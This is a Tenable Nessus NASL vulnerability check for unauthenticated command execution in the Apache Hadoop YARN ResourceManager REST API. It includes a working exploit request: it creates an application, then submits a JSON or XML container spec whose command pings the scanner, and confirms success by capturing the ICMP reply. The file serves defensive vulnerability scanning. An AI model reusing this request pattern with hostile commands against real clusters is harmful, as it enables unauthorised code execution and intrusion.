#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(117615);
  script_version("1.3");
  script_cvs_date("Date: 2019/03/06 18:38:55");

  script_name(english:"Apache Hadoop YARN ResourceManager Unauthenticated RCE (Remote) (Xbash)");
  script_summary(english:"Attempts to execute arbitrary commands on the remote server.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that allows an API
to run system commands without authentication.");
  script_set_attribute(attribute:"description", value:
"The Apache Hadoop YARN ResourceManager running on the remote host is
allowing unauthenticated users to create and execute applications. An
unauthenticated, remote attacker can exploit this, via a specially
crafted HTTP request, to potentially execute arbitrary code, subject
to the user privileges of the executing node.");
  # https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/hadoop_unauth_exec.rb
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?57624ec9");
  script_set_attribute(attribute:"solution", value:
"Configure ResourceManager API access control.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"remote code execution on nodes");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Hadoop YARN ResourceManager Unauthenticated Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/10/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/09/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:hadoop");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("hadoop_resourcemanager_web_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 8088);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("installed_sw/YARN ResourceManager");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("install_func.inc");

app = "YARN ResourceManager";
get_install_count(app_name:app, exit_if_zero:TRUE);
port = get_http_port(default:8088);
isxml = FALSE;

res = http_send_recv3(method:"POST", item:"/ws/v1/cluster/apps/new-application", port:port);
if (res && res[2] && "<?xml" >< res[2])
{
  isxml = TRUE;
  match = pregmatch(string:res[2], pattern:'<application-id>(.*?)</application-id>');
}
else
  match = pregmatch(string:res[2], pattern:'"application-id":"(.+?)"');

if (!match || !match[1])
  audit(AUDIT_INST_VER_NOT_VULN, app);
else
  appid = match[1];

scanner_ip = compat::this_host();
target_ip = get_host_ip();
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

pat = hexstr(rand_str(length:10));
os = get_kb_item("Host/OS");
if (!empty_or_null(os) && "windows" >< tolower(os))
  ping_cmd = "ping -n 3 -l 500 " + scanner_ip;
else
  ping_cmd = "ping -c 3 -s 500 " + scanner_ip;

json = '{"am-container-spec": {"commands": {"command": "' + ping_cmd + '"}}, "application-id": "' + appid + '", "application-type": "YARN", "application-name": "' + hexstr(rand_str(length:10))  + '"}';
xml  = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><application-submission-context><application-id>' + appid + '</application-id><application-name>' + hexstr(rand_str(length:10)) + '</application-name><am-container-spec><commands>' + ping_cmd + '<command></command></commands></am-container-spec><application-type>YARN</application-type></application-submission-context>';

req =  'POST /ws/v1/cluster/apps HTTP/1.1\r\n';
req += 'Host: ' + target_ip + ':' + port + '\r\n';
req += 'Accept: */*\r\n';
req += 'User-Agent: Nessus\r\n';
if (isxml)
  req += 'Content-Length: ' + strlen(xml) + '\r\nContent-Type: application/xml\r\n\r\n' + xml;
else
  req += 'Content-Length: ' + strlen(json) + '\r\nContent-Type: application/json\r\n\r\n' + json;

filter = "icmp and icmp[0] = 8 and dst host " + compat::this_host() + " and greater 500";

s = send_capture(socket:soc,data:req,pcap_filter:filter);
icmp = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
close(soc);

if (icmp)
{
  report =
    '\nNessus confirmed this issue by examining incoming ICMP traffic. '+
    'Below is the response :' +
    '\n\n' + snip +
    '\n' + icmp +
    '\n' + snip +
    '\n';
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    request    : make_list(req),
    output     : report
  );
}
else
  audit(AUDIT_INST_VER_NOT_VULN, app);
